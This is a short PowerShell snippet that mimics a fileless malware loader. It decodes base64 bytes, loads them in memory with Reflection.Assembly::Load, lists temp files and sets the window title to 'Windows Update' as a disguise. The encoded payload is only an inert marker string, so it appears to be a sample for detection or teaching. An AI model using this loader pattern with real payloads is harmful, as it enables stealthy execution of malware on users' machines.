
$PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp3eHVlYnB1c3Iw')
Write-Verbose ("Assembly bytes: " + $PayloadBytes.Length)
[Reflection.Assembly]::Load($PayloadBytes)
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$Host.UI.RawUI.WindowTitle = "Windows Update"
